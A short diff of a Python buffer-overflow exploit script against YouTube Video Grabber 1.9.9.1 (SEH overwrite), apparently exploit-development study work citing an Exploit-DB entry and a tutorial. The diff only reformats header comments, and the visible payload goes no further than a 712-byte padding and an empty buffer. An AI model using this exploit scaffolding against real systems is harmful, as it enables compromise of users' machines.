@@ -1,6 +1,8 @@
-#YouTube Video Grabber 1.9.9.1 - Buffer Overflow (SEH)
-#https://www.exploit-db.com/exploits/50471
-#https://redtm.com/docs/exploit-dev/seh-base-stack-overflow-exploit/
+'''
+Description: YouTube Video Grabber 1.9.9.1 - Buffer Overflow (SEH)
+Existing Exploit: https://www.exploit-db.com/exploits/50471
+Tutorial: https://redtm.com/docs/exploit-dev/seh-base-stack-overflow-exploit/
+'''
 
 junk = b"A"* 712
 buf =  b""
